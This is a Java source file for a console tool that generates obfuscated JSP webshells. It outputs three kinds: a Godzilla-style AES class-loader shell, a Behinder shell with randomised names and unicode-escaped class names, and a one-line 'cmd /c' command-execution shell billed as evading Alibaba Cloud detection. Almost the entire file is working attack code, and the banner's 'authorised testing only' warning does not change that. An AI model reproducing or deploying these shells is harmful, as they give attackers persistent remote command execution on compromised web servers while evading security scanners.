package company;

import org.apache.commons.lang.StringUtils;
import company.MD5Util;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Scanner;

import static company.RandomUtil.generateByRandom;

public class Main {

    public static void main(String[] paramArrayOfString)  {


        System.out.println(StringUtils.EMPTY);

        System.out.println(StringUtils.EMPTY);
        System.out.println("*************************警 告*****************************");
        System.out.println("本工具旨在帮助企业快速定位漏洞修复漏洞,仅限授权安全测试使用!");
        System.out.println("严格遵守《中华人民共和国网络安全法》,禁止未授权非法攻击站点!");
        System.out.println("***********************************************************");
        System.out.println("");
        System.out.println("1、Godzilla java_aes_raw 连接默认密码为: 1");
        System.out.println("2、Behinder默认密码为: baihua666");
        System.out.println("3、生成绕不过阿里云检测 http://XXX:8080/xxx.jsp?baihua666=whoami");
        String str = "tas9er" +generateByRandom(2);
        String str2 = "tas9er" +generateByRandom(2);
        String str3 = "tas9er" +generateByRandom(2);
        String str4 = "tas9er" +generateByRandom(2);
        String str5 = "tas9er" +generateByRandom(2);
        String str6 = "tas9er" +generateByRandom(2);
        String str7 = "tas9er" +generateByRandom(2);
        String str8 = "tas9er" +generateByRandom(2);
        String str9 = "tas9er" +generateByRandom(2);
        String str10 = "tas9er" +generateByRandom(2);
        String str11 = "tas9er" +generateByRandom(2);
        String str12 = "tas9er" +generateByRandom(2);
        String str13 = "tas9er" +generateByRandom(2);
        String replaceAll="";
        System.out.println(StringUtils.EMPTY);


        System.out.printf("[*] 输入密码或回车(使用默认值): ");
        // 获取输入的密码
        Scanner pwd = new Scanner(System.in);
        String passwd = pwd.nextLine();
        String rebepasswd;
        String yijuhua_passwd;
        if (passwd.isEmpty()){
            // 默认baihua666的加密字符串
            rebepasswd = "YjA1MTk1ZDMxM2E4ZTNjMg==";
            yijuhua_passwd = "baihua666";
        } else {
            // 输入的密码
            System.out.println("[*] 一句话、冰蝎, 密码为: " + passwd);
            rebepasswd = MD5Util.Getmd5_16_to_base64(passwd);
            yijuhua_passwd = passwd;
        }
        System.out.println("");
        Scanner sc = new Scanner(System.in);

        System.out.println("[+] 输入 '1' 生成Godzilla;\n[+] 输入 '2' 生成Behinder;\n[+] 输入 '3' 生成绕不过阿里云检测一句话：");


        String firStr = sc.next();


        try {
            if ("1".equals(firStr)){
                System.out.println("[*] 生成中... 密码： 1");
                replaceAll="<%! String xc = \"3c6e0b8a9c15224a\";\n" +
                        "\n" +
                        "    class X extends \\u0043\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072 {\n" +
                        "        public X(\\u0043\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072 z) {\n" +
                        "            super(z);\n" +
                        "        }\n" +
                        "\n" +
                        "        public Class Q(byte[] cb) {\n" +
                        "            return super.defineClass(cb, 0, cb.length);\n" +
                        "        }\n" +
                        "    }\n" +
                        "\n" +
                        "    public byte[] x(byte[] s, boolean m) {\n" +
                        "\t\t  \n" +
                        "          \n" +
                        "        try {\n" +
                        "\n" +
                        "            \n" +
                        "            javax.crypto.Cipher c = javax.crypto.Cipher.\\uuuuuuuuuuuuuuuuuuuuuu0067\\u0065\\u0074\\u0049\\u006e\\u0073\\u0074\\u0061\\u006e\\u0063\\u0065(\"AES\");\n" +
                        "            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), \"AES\"));\n" +
                        "            return c.\\uuuuuuuuuuuuuuuuuu0064\\u006f\\u0046\\u0069\\u006e\\u0061\\u006c(s);\n" +
                        "        } catch (Exception e) {\n" +
                        "            return null;\n" +
                        "        }\n" +
                        "    }\n" +
                        "%><%\n" +
                        "    try {\n" +
                        "        byte[] data = new byte[Integer.parseInt(request.getHeader(\"Content-Length\"))];\n" +
                        "        java.io.InputStream inputStream = request.getInputStream();\n" +
                        "        int _num = 0;\n" +
                        "        while ((_num += inputStream.read(data, _num, data.length)) < data.length) ;\n" +
                        "        data = x(data, false);\n" +
                        "        if (session.getAttribute(\"payload\") == null) {\n" +
                        "            session.setAttribute(\"payload\", new X(this.getClass().get\\uuuuuuuuuuuuuuuuuuuuuuuuuuuuuu0043\\u006c\\u0061\\u0073\\u0073\\u004c\\u006f\\u0061\\u0064\\u0065\\u0072()).Q(data));\n" +
                        "        } else {\n" +
                        "            request.setAttribute(\"parameters\", data);\n" +
                        "            Object f = ((Class) session.getAttribute(\"payload\")).newInstance();\n" +
                        "            java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();\n" +
                        "            f.equals(arrOut);\n" +
                        "            f.equals(pageContext);\n" +
                        "            f.toString();\n" +
                        "            response.getOutputStream().write(x(arrOut.toByteArray(), true));\n" +
                        "        }\n" +
                        "    } catch (Exception e) {\n" +
                        "    }\n" +
                        "%>";
            }
            if ("2".equals(firStr)){
                System.out.println("[*] 生成中... 密码： " + yijuhua_passwd);
                replaceAll = ("Hello Administrator!\nWelCome To  Java Console!" + ("<%@page import=\"sun.misc.*,javax.crypto.Cipher,javax.crypto.spec.SecretKeySpec,java.util.Random\" %>\n<%!\n    class " + str + " extends ClassLoader {\n        " + str + "(ClassLoader " + str2 + ") {\n            super(" + str2 + ");\n        }\n        public Class " + str3 + "(byte[] " + str4 + ") {\n            return super.defineClass(" + str4 + ",0," + str4 + ".length);\n        }\n    }\n%>") + ("<%\n    out.println(\"Random Garbage Data:\");\n    Random " + str9 + " = new Random();\n    int " + str10 + " = " + str9 + ".nextInt(1234);\n    int " + str11 + " = " + str9 + ".nextInt(5678);\n    int " + str12 + " = " + str9 + ".nextInt(1357);\n    int " + str13 + " = " + str9 + ".nextInt(2468);\n    out.println(" + str10 + "+\",\"+" + str11 + "+\",\"+" + str12 + "+\",\"+" + str13 + ");\n    String[] " + str5 + " = new String[]{\"A\", \"P\", \"B\", \"O\", \"C\", \"S\", \"D\", \"T\"};\n    String " + str6 + " = " + str5 + "[1] + " + str5 + "[3] + " + str5 + "[5] + " + str5 + "[7];\n    if (request.getMethod().equals(" + str6 + ")) {\n        String " + str8 + " = new String(new BASE64Decoder().decodeBuffer(\"" + rebepasswd + "\"));\n        session.setAttribute(\"u\", " + str8 + ");\n        Cipher " + str7 + " = Cipher.getInstance(\"AES\");\n        " + str7 + ".init(((" + str10 + " * " + str11 + " + " + str12 + " - " + str13 + ") * 0) + 3 - 1, new SecretKeySpec(" + str8 + ".getBytes(), \"AES\"));\n        new " + str + "(this.getClass().getClassLoader())." + str3 + "(" + str7 + ".doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);\n    }\n%>")).replaceAll("defineClass", "d\\\\uuuuuuuuu0065fineClass").replaceAll("BASE64Decoder", "B\\\\u0041\\\\u0053\\\\u0045\\\\u0036\\\\u0034\\\\u0044\\\\u0065\\\\u0063\\\\u006f\\\\u0064\\\\u0065\\\\u0072").replaceAll("getClass", "\\\\u0067\\\\u0065t\\\\u0043\\\\u006c\\\\u0061\\\\u0073\\\\u0073").replaceAll("ClassLoader", "\\\\u0043l\\\\u0061\\\\u0073\\\\u0073\\\\u004c\\\\u006f\\\\u0061\\\\u0064\\\\u0065\\\\u0072");
            }
            if ("3".equals(firStr)){
                System.out.println("[*] 生成中... 密码： " + "/xxx.jsp?" + yijuhua_passwd + "=whoami");
                replaceAll="<%@ page import=\"java.io.BufferedReader\" %>\n" +
                        "<%@ page import=\"java.io.InputStream\" %>\n" +
                        "<%@ page import=\"java.io.InputStreamReader\" %>\n" +
                        "<%\n" +
                        "    try {\n" +
                        "        final String s = request.getParameter(\"" + yijuhua_passwd + "\");\n" +
                        "        \\uuuuuuuuuuuuuuuuuuuu0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073 process = new \\uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu0050\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073\\u0042\\u0075\\u0069\\u006c\\u0064\\u0065\\u0072().\\u0063\\u006f\\u006d\\u006d\\u0061\\u006e\\u0064(new String[]{ \"cmd\", \"/c\", s}).start();\n" +
                        "        InputStream inputStream = process.getInputStream();\n" +
                        "        StringBuilder stringBuilder = new StringBuilder();\n" +
                        "        BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));\n" +
                        "        String line;\n" +
                        "        while ((line = bufferedReader.readLine()) != null) {\n" +
                        "            stringBuilder.append(line).append(\"\\n\");\n" +
                        "        }\n" +
                        "        response.getOutputStream().write(stringBuilder.toString().getBytes());\n" +
                        "    } catch (Exception e) {\n" +
                        "        e.printStackTrace();\n" +
                        "    }\n" +
                        "\n" +
                        "%>\n";
            }

            BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(new File(new SimpleDateFormat("yyyyMMddhhmmss").format(new Date()) + ".jsp")));

            bufferedWriter.write(replaceAll);
            bufferedWriter.flush();
            bufferedWriter.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

        System.out.println("[+] Succussfully");
    }
}